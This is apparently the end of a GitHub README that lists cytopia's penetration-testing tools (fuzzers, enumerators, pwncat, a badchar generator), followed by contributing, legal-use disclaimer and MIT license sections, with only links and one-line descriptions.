| Name                 | Category             | Language   | Description |
|----------------------|----------------------|------------|-------------|
| **[offsec]**         | Documentation        | Markdown   | Offsec checklist, tools and examples |
| **[header-fuzz]**    | Enumeration          | Bash       | Fuzz HTTP headers |
| **[smtp-user-enum]** | Enumeration          | Python 2+3 | SMTP users enumerator |
| **[urlbuster]**      | Enumeration          | Python 2+3 | Mutable web directory fuzzer |
| **[pwncat]**         | Pivoting             | Python 2+3 | Cross-platform netcat on steroids |
| **[badchars]**       | Reverse Engineering  | Python 2+3 | Badchar generator |
| **[fuzza]**          | Reverse Engineering  | Python 2+3 | TCP fuzzing tool |

[offsec]: https://github.com/cytopia/offsec
[header-fuzz]: https://github.com/cytopia/header-fuzz
[smtp-user-enum]: https://github.com/cytopia/smtp-user-enum
[urlbuster]: https://github.com/cytopia/urlbuster
[pwncat]: https://github.com/cytopia/pwncat
[badchars]: https://github.com/cytopia/badchars
[fuzza]: https://github.com/cytopia/fuzza


## :octocat: Contributing

See **[Contributing guidelines](CONTRIBUTING.md)** to help to improve this project.


## :exclamation: Disclaimer

This tool may be used for legal purposes only. Users take full responsibility for any actions performed using this tool. The author accepts no liability for damage caused by this tool. If these terms are not acceptable to you, then do not use this tool.


## :page_facing_up: License

**[MIT License](LICENSE.txt)**

Copyright (c) 2020 **[cytopia](https://github.com/cytopia)**
